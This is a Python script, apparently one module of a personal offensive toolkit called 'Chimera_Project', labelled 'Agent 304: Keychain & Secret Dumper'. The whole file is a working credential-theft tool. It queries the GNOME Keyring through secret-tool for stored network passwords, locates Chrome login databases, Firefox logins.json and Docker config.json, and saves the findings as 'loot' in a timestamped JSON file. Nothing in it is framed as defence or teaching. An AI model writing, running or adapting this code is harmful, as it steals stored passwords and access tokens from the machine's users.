#!/home/dan/Chimera_Project/venv/bin/python3
import os
import sys
import subprocess
import json
from datetime import datetime

class KeychainDumper:
    """
    Agent 304: Encrypted Secret Extractor.
    Interacts with the system's secret-service (D-Bus) to dump 
    stored credentials from the GNOME Keyring or Secret Service API.
    """
    def __init__(self):
        self.loot_dir = "/home/dan/Chimera_Project/agents/304_Keychain_Dumper/loot"
        os.makedirs(self.loot_dir, exist_ok=True)

    def dump_gnome_keyring(self):
        """
        Uses 'secret-tool' (standard on many Linux distros) to query the keyring.
        In a professional environment, we'd use the dbus-python library 
        to avoid external binary calls, but this is a high-fidelity primitive.
        """
        print("[*] Interrogating GNOME Keyring via Secret Service API...")
        try:
            # We search for all stored 'network' and 'web' passwords
            # Note: This usually requires an active D-Bus session.
            cmd = ["secret-tool", "search", "--all", "usage", "network"]
            result = subprocess.check_output(cmd, stderr=subprocess.STDOUT).decode()
            return result
        except subprocess.CalledProcessError:
            return "No accessible secrets found or secret-tool not installed."
        except Exception as e:
            return f"Error: {e}"

    def hunt_config_secrets(self):
        """Scans common desktop config files that store secrets in the clear."""
        print("[*] Scanning application-specific secret stores...")
        targets = [
            os.path.expanduser("~/.config/google-chrome/Default/Login Data"),
            os.path.expanduser("~/.mozilla/firefox/*.default-release/logins.json"),
            os.path.expanduser("~/.docker/config.json")
        ]
        found = []
        for t in targets:
            if "*" in t: # Handle globbing for Firefox profiles
                import glob
                matches = glob.glob(t)
                for m in matches:
                    if os.path.exists(m): found.append(m)
            elif os.path.exists(t):
                found.append(t)
        return found

    def execute(self):
        print("--- [AGENT 304: KEYCHAIN & SECRET DUMPER ACTIVE] ---")
        
        results = {
            "keyring_dump": self.dump_gnome_keyring(),
            "discovered_files": self.hunt_config_secrets(),
            "timestamp": str(datetime.now())
        }

        # Commit to Loot
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        loot_file = f"{self.loot_dir}/secrets_{timestamp}.json"
        with open(loot_file, 'w') as f:
            json.dump(results, f, indent=4)
            
        print(f"[!!!] DUMP COMPLETE. SENSITIVE DATA COMMITTED TO: {loot_file}")

if __name__ == "__main__":
    KeychainDumper().execute()
